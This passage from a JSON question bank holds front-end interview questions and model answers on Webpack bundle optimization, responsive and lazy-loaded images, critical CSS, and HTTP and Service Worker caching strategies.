          "question": "You are given a `webpack.config.js` file for a React application. Your goal is to optimize the bundle size. Specifically, you need to:\n1.  Ensure JavaScript files are aggressively minified.\n2.  Optimize chunk splitting to extract vendor libraries and common modules into separate chunks for better caching.\n3.  Ensure tree shaking is enabled.\n\nModify the provided Webpack configuration to achieve these goals.\n\n```javascript\nconst path = require('path');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  // Missing optimization settings here\n};\n```",
          "answer": "```javascript\nconst path = require('path');\nconst TerserPlugin = require('terser-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js',\n  output: {\n    filename: '[name].[contenthash].js',\n    path: path.resolve(__dirname, 'dist'),\n    clean: true, // Clean the dist folder before each build\n  },\n  mode: 'production', // Enables tree shaking, minification, and other production optimizations\n  optimization: {\n    minimize: true, // Explicitly enable minimization\n    minimizer: [\n      new TerserPlugin({ // Configure TerserPlugin for JS minification\n        terserOptions: {\n          compress: {\n            drop_console: true, // Drop console.log statements in production\n          },\n        },\n      }),\n      // new CssMinimizerPlugin(), // Add for CSS minification if you have CSS in your bundles\n    ],\n    splitChunks: {\n      chunks: 'all', // Apply splitting to all chunks (initial and async)\n      minSize: 20000, // Minimum size of a chunk before it's considered for splitting\n      maxInitialRequests: 20, // Max requests for initial load (to prevent too many small chunks)\n      maxAsyncRequests: 20,   // Max requests for on-demand chunks\n      cacheGroups: {\n        vendor: {\n          test: /[\\\\/]node_modules[\\\\/]/,\n          name: 'vendors',\n          chunks: 'all',\n        },\n        common: {\n          minChunks: 2, // Modules shared by at least 2 chunks\n          priority: -10,\n          reuseExistingChunk: true,\n        },\n      },\n    },\n  },\n  // Add other necessary loaders (e.g., babel-loader for React/ES6+)\n  module: {\n    rules: [\n      {\n        test: /\\.(js|jsx)$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'],\n          },\n        },\n      },\n    ],\n  },\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correctly setting `mode` to 'production'.",
            "Implementing `TerserPlugin` for JavaScript minification.",
            "Configuring `splitChunks` with `chunks: 'all'` and appropriate `cacheGroups`.",
            "Understanding `contenthash` for better caching invalidation.",
            "Adding `clean: true` for output management."
          ],
          "keyConcepts": [
            "Webpack",
            "Bundle Optimization",
            "Minification",
            "Tree Shaking",
            "Code Splitting",
            "TerserPlugin",
            "Caching"
          ],
          "evaluationCriteria": [
            "Correct Webpack configuration syntax",
            "Effective application of optimization techniques",
            "Completeness of solution for stated goals"
          ],
          "example": null,
          "tags": [
            "Webpack",
            "Performance",
            "Optimization",
            "Coding"
          ],
          "prerequisites": [
            "webpack_basics",
            "bundle_size_optimization"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_image_opt_1",
          "topic": "Image Optimization",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the purpose of the `loading=\"lazy\"` attribute on an `<img>` tag?",
          "answer": "The `loading=\"lazy\"` attribute enables native lazy loading for images, deferring the loading of off-screen images until they are about to enter the viewport, thus improving initial page load performance.",
          "analysisPoints": [
            "Purpose of lazy loading.",
            "Impact on performance.",
            "Mechanism (off-screen images)."
          ],
          "keyConcepts": [
            "Lazy Loading",
            "Image Optimization",
            "Performance"
          ],
          "evaluationCriteria": [
            "Recall of attribute functionality"
          ],
          "example": null,
          "tags": [
            "HTML",
            "Images",
            "Performance",
            "Lazy Loading"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_image_opt_2",
          "topic": "Image Optimization",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following HTML structures effectively leverages modern image formats with a fallback for older browsers?",
          "answer": "Option A",
          "options": [
            "Option A: \n```html\n<picture>\n  <source type=\"image/webp\" srcset=\"image.webp\">\n  <img src=\"image.jpg\" alt=\"Optimized image\">\n</picture>\n```",
            "Option B: \n```html\n<img src=\"image.webp\" alt=\"Optimized image\">\n<img src=\"image.jpg\" alt=\"Fallback image\">\n```",
            "Option C: \n```html\n<source type=\"image/webp\" srcset=\"image.webp\">\n<img src=\"image.jpg\" alt=\"Optimized image\">\n```",
            "Option D: \n```html\n<picture src=\"image.webp\" fallback=\"image.jpg\" alt=\"Optimized image\"></picture>\n```"
          ],
          "analysisPoints": [
            "Correct use of the `<picture>` element for multiple sources.",
            "Understanding the role of `<source>` tags with `type` and `srcset`.",
            "Recognizing the `<img>` tag as the final fallback within `<picture>`."
          ],
          "keyConcepts": [
            "Picture Element",
            "Image Formats",
            "WebP",
            "HTML5",
            "Responsive Images"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of HTML for responsive images",
            "Understanding of browser fallback behavior"
          ],
          "example": "Option A correctly uses the `<picture>` element. The browser will check `source` tags in order and use the first one it supports (e.g., WebP). If no `source` is supported, it falls back to the `<img>` tag. This ensures that modern browsers get the optimized WebP format, while older browsers or those not supporting WebP still display the JPEG image.",
          "tags": [
            "HTML",
            "Images",
            "WebP",
            "Optimization",
            "MCQ"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_image_opt_3",
          "topic": "Image Optimization",
          "level": "hard",
          "type": "open",
          "question": "You are tasked with optimizing image delivery for a highly visual e-commerce website. Describe a comprehensive strategy for image optimization, considering different device types, network conditions, and content management. Include specific HTML attributes, image formats, and any other relevant technologies.",
          "answer": "A comprehensive image optimization strategy for an e-commerce website should cover the entire image lifecycle, from upload to delivery:\n\n1.  **Image Formats**: \n    *   **Modern Formats**: Prioritize `WebP` and `AVIF` for all primary images (product photos, banners) due to their superior compression and quality. Use the `<picture>` element with multiple `<source>` tags to provide fallbacks (`image/jpeg`, `image/png`) for browsers that don't support these newer formats.\n    *   **Vector Graphics**: Use `SVG` for logos, icons, and simple illustrations as they are resolution-independent and typically very small in file size.\n\n2.  **Responsive Images**: \n    *   Use `srcset` with `w` descriptors to provide multiple versions of an image at different widths (e.g., `image-400w.jpg`, `image-800w.jpg`, `image-1200w.jpg`).\n    *   Combine with `sizes` attribute to inform the browser about the rendered size of the image at various viewport widths (e.g., `sizes=\"(max-width: 600px) 100vw, (max-width: 1200px) 50vw, 800px\"`). This allows the browser to fetch the most appropriately sized image for the user's device and screen.\n\n3.  **Lazy Loading**: \n    *   Implement `loading=\"lazy\"` for all images that are 'below the fold' (not immediately visible on page load). This defers the download of these images until the user scrolls near them, significantly improving initial page load time and FCP/LCP.\n    *   Consider using Intersection Observer API for custom lazy loading solutions if native lazy loading is not sufficient or for non-image content.\n\n4.  **Image Compression**: \n    *   Apply aggressive but visually lossless compression to all images during the build process or upon upload. Use tools like `TinyPNG`, `ImageOptim`, or build-time plugins (`imagemin-webpack-plugin`).\n    *   Strip metadata (EXIF data) from images.\n\n5.  **Content Delivery Network (CDN)**: \n    *   Serve all images via a CDN. CDNs store copies of your images on servers geographically distributed around the world, delivering them from the closest server to the user, reducing latency.\n    *   Many CDNs offer built-in image optimization features (resizing, format conversion, compression) on the fly.\n\n6.  **Server-Side Optimizations**: \n    *   Ensure the server sends appropriate `Cache-Control` headers for images (`max-age`, `immutable`) to maximize browser caching.\n    *   Implement `ETag` or `Last-Modified` headers for efficient revalidation.\n    *   Enable Gzip or Brotli compression for image types that benefit from it (e.g., SVGs, but not already compressed formats like JPEG/WebP).\n\n7.  **Content Management System (CMS) / Image Service Integration**: \n    *   If using a CMS, integrate with an image optimization service (e.g., Cloudinary, Imgix, Cloudflare Images) that can automate many of these steps: responsive variants, format conversion, compression, and CDN delivery, often via URL parameters.",
          "analysisPoints": [
            "Comprehensive coverage of image optimization techniques.",
            "Ability to integrate multiple technologies and concepts.",
            "Understanding of the full image lifecycle (from upload to delivery).",
            "Consideration of different user scenarios (device, network)."
          ],
          "keyConcepts": [
            "Image Optimization",
            "Responsive Images",
            "Lazy Loading",
            "WebP",
            "Picture Element",
            "CDN",
            "HTTP Caching",
            "Compression"
          ],
          "evaluationCriteria": [
            "Depth and breadth of strategy",
            "Practical relevance",
            "Clarity of explanation"
          ],
          "example": null,
          "tags": [
            "Images",
            "Performance",
            "HTML",
            "Advanced",
            "Architecture"
          ],
          "prerequisites": [
            "html_basics",
            "css_media_queries",
            "http_basics"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_image_opt_4",
          "topic": "Image Optimization",
          "level": "easy",
          "type": "flashcard",
          "question": "When using `srcset` and `sizes` attributes for responsive images, what does the `w` descriptor in `srcset` (e.g., `image.jpg 1000w`) indicate?",
          "answer": "The `w` descriptor indicates the intrinsic width of the image file in pixels (e.g., `1000w` means the image file is 1000 pixels wide).",
          "analysisPoints": [
            "Recall of `srcset` descriptor meaning."
          ],
          "keyConcepts": [
            "srcset",
            "Responsive Images",
            "HTML"
          ],
          "evaluationCriteria": [
            "Recall of HTML attribute details"
          ],
          "example": null,
          "tags": [
            "HTML",
            "Images",
            "Responsive Design"
          ],
          "prerequisites": [
            "html_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_image_opt_5",
          "topic": "Image Optimization",
          "level": "medium",
          "type": "code",
          "question": "Create an `<img>` tag that displays `product_small.jpg` by default, but should load `product_medium.jpg` (600px wide) when the viewport is at least 600px wide, and `product_large.jpg` (1200px wide) when the viewport is at least 1200px wide. The image should take up 100% of the viewport width on small screens (up to 599px), 50% on medium screens (600px to 1199px), and a fixed 800px on large screens (1200px and above). Also, ensure it's lazy-loaded and has appropriate alt text.",
          "answer": "```html\n<img \n  src=\"product_small.jpg\" \n  srcset=\"product_small.jpg 300w, product_medium.jpg 600w, product_large.jpg 1200w\" \n  sizes=\"(max-width: 599px) 100vw, (max-width: 1199px) 50vw, 800px\" \n  alt=\"A detailed image of the product for sale\"\n  loading=\"lazy\"\n>\n```",
          "options": [],
          "analysisPoints": [
            "Correctly using `src` for fallback.",
            "Accurately mapping image files to their widths in `srcset`.",
            "Precisely defining `sizes` media queries and corresponding display widths.",
            "Including `loading='lazy'` and `alt` attributes."
          ],
          "keyConcepts": [
            "Responsive Images",
            "srcset",
            "sizes",
            "Lazy Loading",
            "HTML"
          ],
          "evaluationCriteria": [
            "Syntactic correctness",
            "Logical application of responsive image attributes",
            "Completeness"
          ],
          "example": null,
          "tags": [
            "HTML",
            "Images",
            "Responsive Design",
            "Coding"
          ],
          "prerequisites": [
            "html_basics",
            "css_media_queries"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_image_opt_6",
          "topic": "Image Optimization",
          "level": "medium",
          "type": "open",
          "question": "What is the difference between the `srcset` and `sizes` attributes on an `<img>` tag?",
          "answer": "-   **`srcset`**: This attribute provides a list of image source candidates for the browser to choose from. Each candidate specifies an image URL followed by either its intrinsic width in pixels (e.g., `image.jpg 1000w`) or its pixel density (e.g., `image@2x.jpg 2x`). The `srcset` tells the browser *what images are available* and their respective resolutions.\n\n-   **`sizes`**: This attribute defines how wide the image will be displayed on the page at different viewport sizes, using media conditions (similar to CSS media queries) and corresponding width values (e.g., `(max-width: 600px) 100vw, 50vw`). The `sizes` attribute tells the browser *how much space the image will take up* on the layout.\n\n**How they work together**: The browser uses the information from `sizes` to determine the effective display width of the image for the current viewport. Then, it uses this calculated width, along with the device's pixel density, to select the most appropriate image URL from the `srcset` list. Without `sizes`, the browser assumes the image will take up 100% of the available width, and it might not pick the most efficient image from `srcset` for complex layouts.",
          "analysisPoints": [
            "Clear differentiation between `srcset` and `sizes`.",
            "Explanation of what each attribute conveys to the browser.",
            "Description of their combined functionality in responsive image selection."
          ],
          "keyConcepts": [
            "srcset",
            "sizes",
            "Responsive Images",
            "HTML"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions",
            "Clarity of relationship between attributes"
          ],
          "example": null,
          "tags": [
            "HTML",
            "Images",
            "Responsive Design",
            "Theory"
          ],
          "prerequisites": [
            "html_basics",
            "css_media_queries"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_critical_css_1",
          "topic": "Critical CSS",
          "level": "easy",
          "type": "flashcard",
          "question": "What is 'Critical CSS'?",
          "answer": "Critical CSS is the minimum amount of CSS required to render the 'above-the-fold' content (visible without scrolling) of a webpage, designed to improve initial loading performance.",
          "analysisPoints": [
            "Definition of Critical CSS.",
            "Concept of 'above-the-fold'.",
            "Primary goal (performance)."
          ],
          "keyConcepts": [
            "Critical CSS",
            "Performance",
            "FCP",
            "LCP"
          ],
          "evaluationCriteria": [
            "Recall of definition and purpose"
          ],
          "example": null,
          "tags": [
            "CSS",
            "Performance",
            "FCP"
          ],
          "prerequisites": [
            "css_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_critical_css_2",
          "topic": "Critical CSS",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following HTML `<head>` section:\n\n```html\n<head>\n  <style>\n    /* Critical styles */\n    body { font-family: sans-serif; }\n    header { background: #f0f0f0; }\n  </style>\n  \n  <link rel=\"preload\" href=\"styles.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">\n  <noscript><link rel=\"stylesheet\" href=\"styles.css\"></noscript>\n</head>\n```\n\nWhat is the main benefit of loading `styles.css` using `rel=\"preload\"` and the `onload` trick, rather than just `rel=\"stylesheet\"`?",
          "answer": "It allows the browser to download `styles.css` without blocking the initial rendering of the page.",
          "options": [
            "It forces the browser to cache `styles.css` indefinitely.",
            "It prevents `styles.css` from ever being downloaded.",
            "It allows the browser to download `styles.css` without blocking the initial rendering of the page.",
            "It ensures `styles.css` is only loaded if JavaScript is disabled."
          ],
          "analysisPoints": [
            "Understanding of render-blocking resources.",
            "Mechanism of `preload` and `onload` trick.",
            "Impact on FCP."
          ],
          "keyConcepts": [
            "Critical CSS",
            "Render Blocking",
            "Preload",
            "Performance",
            "FCP"
          ],
          "evaluationCriteria": [
            "Knowledge of asynchronous CSS loading",
            "Understanding of its performance implications"
          ],
          "example": "When a stylesheet is linked with `rel=\"stylesheet\"`, the browser typically pauses rendering until the CSS file is downloaded and parsed. Using `rel=\"preload\"` with `as=\"style\"` tells the browser to fetch the CSS file with high priority but without blocking the initial render. The `onload` event then switches `rel` to `stylesheet` once the file is loaded, applying the styles. This ensures the browser can paint the critical content faster, leading to a better First Contentful Paint.",
          "tags": [
            "HTML",
            "CSS",
            "Performance",
            "Preload",
            "MCQ"
          ],
          "prerequisites": [
            "html_basics",
            "css_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_critical_css_3",
          "topic": "Critical CSS",
          "level": "hard",
          "type": "open",
          "question": "Describe the process of extracting and implementing critical CSS for a web application. Discuss the tools and considerations involved, and how it contributes to Core Web Vitals.",
          "answer": "The process of extracting and implementing critical CSS involves identifying, inlining, and asynchronously loading styles to optimize rendering:\n\n**Process:**\n1.  **Identify Above-the-Fold Content**: Determine which HTML elements and their corresponding styles are essential for the initial view of the page without scrolling.\n2.  **Extract Critical CSS**: Use specialized tools to analyze the rendered DOM and extract only the CSS rules that apply to the above-the-fold content. These tools typically simulate various viewport sizes.\n3.  **Inline Critical CSS**: Embed the extracted critical CSS directly within a `<style>` block in the `<head>` of the HTML document. This makes the styles available immediately without an extra network request, allowing the browser to render the critical content as soon as the HTML is parsed.\n4.  **Asynchronously Load Remaining CSS**: Load the full (non-critical) stylesheet asynchronously. A common technique is to use `<link rel=\"preload\" href=\"styles.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">` combined with a `<noscript>` fallback. This fetches the main CSS in the background, without blocking initial rendering, and applies it once downloaded.\n\n**Tools Involved:**\n*   **Critical CSS Generators**: Libraries like `critical` (Node.js), `penthouse`, or online services. These tools often integrate with build pipelines (e.g., Webpack plugins like `critical-css-webpack-plugin`).\n*   **Headless Browsers**: Tools use headless Chrome (e.g., Puppeteer) to render the page and identify visible styles.\n*   **Build Tools**: Webpack, Gulp, Grunt for automating the extraction and inlining process.\n\n**Considerations:**\n*   **Automation**: Manual extraction is tedious and error-prone; automation is crucial, especially for dynamic content.\n*   **Dynamic Content/User Interaction**: Critical CSS might vary for different pages or states. A robust solution might need to generate critical CSS per route or for common layouts.\n*   **Maintaining Freshness**: Critical CSS needs to be regenerated whenever styles or page layouts change.\n*   **Cache Invalidation**: Inlining CSS means it's part of the HTML, so HTML caching needs to be considered. If critical CSS changes frequently, it can affect HTML caching efficiency.\n*   **HTML Size**: Inlining increases the size of the initial HTML payload. It's a trade-off; the benefit of immediate rendering usually outweighs the increased HTML size for critical styles.\n\n**Contribution to Core Web Vitals:**\n*   **First Contentful Paint (FCP)**: Directly improved. By inlining critical CSS, the browser can render the first pixel of content on the screen much faster, as it doesn't have to wait for external CSS files to be fetched and parsed.\n*   **Largest Contentful Paint (LCP)**: Directly improved. Critical CSS ensures that the largest visual element above the fold is styled and rendered quickly, contributing to a lower LCP score.\n*   **Cumulative Layout Shift (CLS)**: Indirectly improved. If the non-critical CSS loads later and causes layout shifts (e.g., unstyled content flashes and then reflows), CLS can be negatively impacted. However, by loading *all* CSS (critical and non-critical) more efficiently, the potential for layout shifts is reduced, as elements are styled sooner.",
          "analysisPoints": [
            "Detailed explanation of the critical CSS workflow.",
            "Identification of relevant tools and technologies.",
            "Discussion of practical challenges and considerations.",
            "Clear articulation of impact on Core Web Vitals (FCP, LCP, CLS)."
          ],
          "keyConcepts": [
            "Critical CSS",
            "Core Web Vitals",
            "FCP",
            "LCP",
            "Render Blocking",
            "Automation",
            "Performance Optimization"
          ],
          "evaluationCriteria": [
            "Comprehensive process description",
            "Tool knowledge",
            "Understanding of performance metrics"
          ],
          "example": null,
          "tags": [
            "CSS",
            "Performance",
            "Core Web Vitals",
            "Advanced",
            "Architecture"
          ],
          "prerequisites": [
            "html_basics",
            "css_basics",
            "web_performance_metrics"
          ],
          "complexity": 9,
          "interviewFrequency": 9,
          "learningPath": "expert"
        },
        {
          "id": "question_critical_css_4",
          "topic": "Critical CSS",
          "level": "medium",
          "type": "code",
          "question": "You have an external stylesheet `main.css` that contains all your website's styles. Refactor the HTML `<head>` section to ensure that only the styles for the header (e.g., `h1` and `nav` elements) are immediately available for rendering, while the rest of `main.css` loads asynchronously. Assume critical styles for header are:\n\n```css\nh1 { color: #333; font-size: 2em; }\nnav ul { list-style: none; padding: 0; display: flex; }\nnav li { margin-right: 15px; }\n```\n",
          "answer": "```html\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Optimized Page</title>\n\n  <style>\n    /* Critical CSS for above-the-fold header content */\n    h1 { color: #333; font-size: 2em; }\n    nav ul { list-style: none; padding: 0; display: flex; }\n    nav li { margin-right: 15px; }\n  </style>\n  \n  <!-- Asynchronously load the full stylesheet -->\n  <link rel=\"preload\" href=\"main.css\" as=\"style\" onload=\"this.onload=null;this.rel='stylesheet'\">\n  <noscript><link rel=\"stylesheet\" href=\"main.css\"></noscript>\n</head>\n<body>\n  <header>\n    <h1>My Website Title</h1>\n    <nav>\n      <ul>\n        <li>Home</li>\n        <li>About</li>\n        <li>Contact</li>\n      </ul>\n    </nav>\n  </header>\n  <main>\n    <!-- Other page content -->\n  </main>\n</body>\n```",
          "options": [],
          "analysisPoints": [
            "Correctly identifying and inlining critical CSS within a `<style>` tag.",
            "Using `rel='preload'` with `as='style'` for asynchronous loading.",
            "Implementing the `onload` trick to activate the stylesheet.",
            "Providing a `<noscript>` fallback."
          ],
          "keyConcepts": [
            "Critical CSS",
            "Inlining CSS",
            "Asynchronous Loading",
            "Preload",
            "HTML"
          ],
          "evaluationCriteria": [
            "Correct HTML structure and attributes",
            "Logical separation of critical and non-critical CSS"
          ],
          "example": null,
          "tags": [
            "HTML",
            "CSS",
            "Performance",
            "Coding"
          ],
          "prerequisites": [
            "html_basics",
            "css_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_critical_css_5",
          "topic": "Critical CSS",
          "level": "easy",
          "type": "flashcard",
          "question": "What two Core Web Vitals metrics are most directly improved by implementing Critical CSS?",
          "answer": "First Contentful Paint (FCP) and Largest Contentful Paint (LCP).",
          "analysisPoints": [
            "Recall of relevant Core Web Vitals."
          ],
          "keyConcepts": [
            "FCP",
            "LCP",
            "Core Web Vitals",
            "Critical CSS"
          ],
          "evaluationCriteria": [
            "Recall of performance metrics"
          ],
          "example": null,
          "tags": [
            "Performance",
            "Core Web Vitals",
            "FCP",
            "LCP"
          ],
          "prerequisites": [
            "web_performance_metrics"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_caching_1",
          "topic": "Caching Strategies",
          "level": "easy",
          "type": "flashcard",
          "question": "What does the HTTP `Cache-Control: no-store` header mean?",
          "answer": "It means that the response should not be stored in any cache, neither by the browser nor by any intermediate proxies. It ensures the content is always fetched from the origin server.",
          "analysisPoints": [
            "Definition of `no-store`.",
            "Impact on caching behavior.",
            "Scope (browser and proxies)."
          ],
          "keyConcepts": [
            "HTTP Caching",
            "Cache-Control",
            "no-store"
          ],
          "evaluationCriteria": [
            "Recall of specific HTTP header directive"
          ],
          "example": null,
          "tags": [
            "HTTP",
            "Caching",
            "Performance"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_caching_2",
          "topic": "Caching Strategies",
          "level": "medium",
          "type": "mcq",
          "question": "You have a JavaScript bundle (`bundle.abc123.js`) where `abc123` is a content hash that changes whenever the file content changes. Which `Cache-Control` header combination would be most appropriate to maximize caching efficiency for this asset, assuming you want it cached for one year and avoid revalidation for that period?",
          "answer": "Cache-Control: public, max-age=31536000, immutable",
          "options": [
            "Cache-Control: no-cache, max-age=31536000",
            "Cache-Control: no-store",
            "Cache-Control: public, max-age=31536000, immutable",
            "Cache-Control: private, max-age=31536000"
          ],
          "analysisPoints": [
            "Understanding of `max-age` for expiry duration.",
            "Understanding `public` for shared caches.",
            "Crucial role of `immutable` with content-hashed URLs for avoiding revalidation.",
            "Distinguishing `no-cache` and `no-store` from long-term caching."
          ],
          "keyConcepts": [
            "HTTP Caching",
            "Cache-Control",
            "max-age",
            "immutable",
            "Content Hashing",
            "Performance"
          ],
          "evaluationCriteria": [
            "Application of caching headers for specific use cases",
            "Understanding of content-hashed URLs benefits"
          ],
          "example": "`public` allows the asset to be cached by any cache. `max-age=31536000` sets the cache duration to one year. `immutable` is key here: because the filename includes a content hash, the file's content will never change. `immutable` tells the browser that once this file is cached, it can be used for the entire `max-age` period without revalidation, even on subsequent page loads or browser restarts, drastically reducing network requests.",
          "tags": [
            "HTTP",
            "Caching",
            "Performance",
            "MCQ"
          ],
          "prerequisites": [
            "http_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_caching_3",
          "topic": "Caching Strategies",
          "level": "hard",
          "type": "open",
          "question": "Compare and contrast HTTP caching (`Cache-Control` headers) with Service Worker caching. Discuss scenarios where each is preferred or how they can complement each other.",
          "answer": "**HTTP Caching (`Cache-Control` Headers)**:\n*   **Mechanism**: Controlled by server-sent HTTP headers (e.g., `Cache-Control`, `Expires`, `ETag`, `Last-Modified`). The browser's built-in HTTP cache stores resources locally based on these directives.\n*   **Control**: Primarily controlled by the server. Clients have limited control over *how* things are cached, only whether to use a cached version or revalidate.\n*   **Flexibility**: Less flexible. Directives are 'all or nothing' for a given resource. Cannot intercept requests or implement complex routing logic.\n*   **Scope**: Applies to individual HTTP responses. Cached items are typically cleared by browser cache clearing, or when `max-age` expires, or when revalidation fails.\n*   **Offline Support**: No inherent offline support. If a cached resource expires or is not available and there's no network, the resource cannot be served.\n*   **Ease of Use**: Relatively simple to implement by configuring web servers or application frameworks.\n\n**Service Worker Caching (Cache API)**:\n*   **Mechanism**: A JavaScript file that runs in the background, acting as a programmable network proxy. It intercepts requests via the `fetch` event and uses the `Cache` API to store and retrieve responses.\n*   **Control**: Fully controlled by the client-side JavaScript. Developers can programmatically decide which requests to cache, when to cache them, and what strategy to use (e.g., Cache First, Network First, Stale While Revalidate).\n*   **Flexibility**: Highly flexible. Can intercept any network request originating from the client, implement complex caching strategies, handle network failures, and even serve synthetic responses.\n*   **Scope**: Manages its own `CacheStorage`. Cached items persist even after the browser tab is closed and are independent of the browser's HTTP cache. Allows fine-grained control over cache invalidation.\n*   **Offline Support**: Core feature. Can serve content even when the network is unavailable, enabling Progressive Web Apps (PWAs).\n*   **Ease of Use**: More complex to implement due to the asynchronous and event-driven nature of Service Workers, requiring careful error handling and cache management logic.\n\n**Scenarios and Complementarity**: \n*   **HTTP Caching Preferred**: \n    *   For **static assets with content-hashed filenames** (e.g., `bundle.abc.js`, `style.xyz.css`): `Cache-Control: public, max-age=31536000, immutable` is ideal. This is highly efficient because the browser knows the file will never change and won't even revalidate it for a year, drastically reducing server load and network traffic for these unchanging resources.\n    *   For **small, frequently updated assets that need quick invalidation**: `Cache-Control: no-cache` with `ETag` or `Last-Modified` allows revalidation without re-downloading if content hasn't changed.\n    *   When **offline support or complex caching logic is not required**.\n\n*   **Service Worker Caching Preferred**: \n    *   For **offline capabilities (PWAs)**: Essential for providing a reliable offline experience.\n    *   For **custom caching strategies**: e.g., 'Stale While Revalidate' for dynamic API data, ensuring fast display while also updating content in the background.\n    *   For **app shell caching**: Pre-caching core UI assets during the `install` phase to ensure immediate load on subsequent visits.\n    *   For **complex routing/resource handling**: When you need to intercept specific requests, fallback to a cached version on network failure, or serve different content based on network conditions.\n\n*   **Complementary Use**: \n    *   HTTP caching should always be the **first line of defense** for static assets. It's handled by the browser and often optimized by CDNs. This offloads a lot of the work.\n    *   Service Workers then act as the **second layer of caching**, providing a programmatic, more resilient, and offline-capable caching layer for everything else. They can intercept requests that bypass HTTP cache (e.g., `no-cache` requests or expired content) and apply custom logic. For instance, a Service Worker could implement 'stale-while-validate' for an API response that *would not* be cached by HTTP headers (due to `no-cache`), but is desired to be served quickly from SW cache while refreshing in background.",
          "analysisPoints": [
            "In-depth understanding of both caching mechanisms.",
            "Clear articulation of strengths and weaknesses of each.",
            "Specific examples of use cases where one is preferred over the other.",
            "Explanation of how they work synergistically."
          ],
          "keyConcepts": [
            "HTTP Caching",
            "Service Worker",
            "Cache-Control",
            "Cache API",
            "Offline",
            "PWA",
            "Performance",
            "Network"
          ],
          "evaluationCriteria": [
            "Comprehensive comparison",
            "Contextual application of knowledge",
            "Strategic understanding"
          ],
          "example": null,
          "tags": [
            "Caching",
            "HTTP",
            "Service Worker",
            "Advanced",
            "Architecture"
          ],
          "prerequisites": [
            "http_basics",
            "javascript_async_programming"
          ],
          "complexity": 9,
          "interviewFrequency": 10,
          "learningPath": "expert"
        },
        {
          "id": "question_caching_4",
          "topic": "Caching Strategies",
          "level": "medium",
          "type": "code",
          "question": "Implement a simple Service Worker `fetch` event listener that uses a 'Network First, then Cache' strategy. If the network request fails or returns an invalid response (not 200 OK), it should attempt to serve the response from the cache. Ensure the cache is updated with the fresh network response if successful.\n\n```javascript\n// service-worker.js\nconst CACHE_NAME = 'dynamic-v1';\n\nself.addEventListener('fetch', event => {\n  // Implement network-first strategy here\n});\n```",
          "answer": "```javascript\n// service-worker.js\nconst CACHE_NAME = 'dynamic-v1';\n\nself.addEventListener('fetch', event => {\n  event.respondWith(\n    fetch(event.request) // Try fetching from the network first\n      .then(response => {\n        // Check if we received a valid response (e.g., 200 OK)\n        if (!response || response.status !== 200 || response.type !== 'basic') {\n          // If network response is invalid, try cache (or throw error/return network error)\n          return caches.match(event.request); \n        }\n\n        // If valid network response, clone it to put in cache and return it\n        const responseToCache = response.clone();\n        caches.open(CACHE_NAME)\n          .then(cache => {\n            cache.put(event.request, responseToCache); // Update cache with fresh response\n          });\n\n        return response; // Return the network response\n      })\n      .catch(() => {\n        // Network request failed (e.g., offline), serve from cache\n        console.log('Network request failed, serving from cache:', event.request.url);\n        return caches.match(event.request);\n      })\n  );\n});\n\n// You would typically also have 'install' and 'activate' events\n// to pre-cache static assets and clean up old caches.\n```",
          "options": [],
          "analysisPoints": [
            "Correctly using `fetch` first in the promise chain.",
            "Handling network errors gracefully by falling back to cache.",
            "Cloning the network response before caching it.",
            "Updating the cache with the fresh network response."
          ],
          "keyConcepts": [
            "Service Worker",
            "Caching Strategy",
            "Network First",
            "Fetch API",
            "Cache API",
            "Offline"
          ],
          "evaluationCriteria": [
            "Correct implementation of caching strategy",
            "Error handling for network failures",
            "Efficient use of Cache API"
          ],
          "example": null,
          "tags": [
            "Service Worker",
            "Caching",
            "Coding",
            "PWA"
          ],
          "prerequisites": [
            "javascript_promises",
            "fetch_api",
            "service_worker_basics"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_caching_5",
          "topic": "Caching Strategies",
          "level": "easy",
          "type": "flashcard",
          "question": "Name two common HTTP caching headers.",
          "answer": "`Cache-Control` and `Expires` (or `ETag`, `Last-Modified`).",
          "analysisPoints": [
            "Recall of common HTTP caching headers."
          ],
          "keyConcepts": [
            "HTTP Caching",
            "Cache-Control",
            "Expires",
            "ETag",
            "Last-Modified"
          ],
          "evaluationCriteria": [
            "Recall of specific terminology"
          ],
          "example": null,
          "tags": [
            "HTTP",
            "Caching"
          ],
          "prerequisites": [
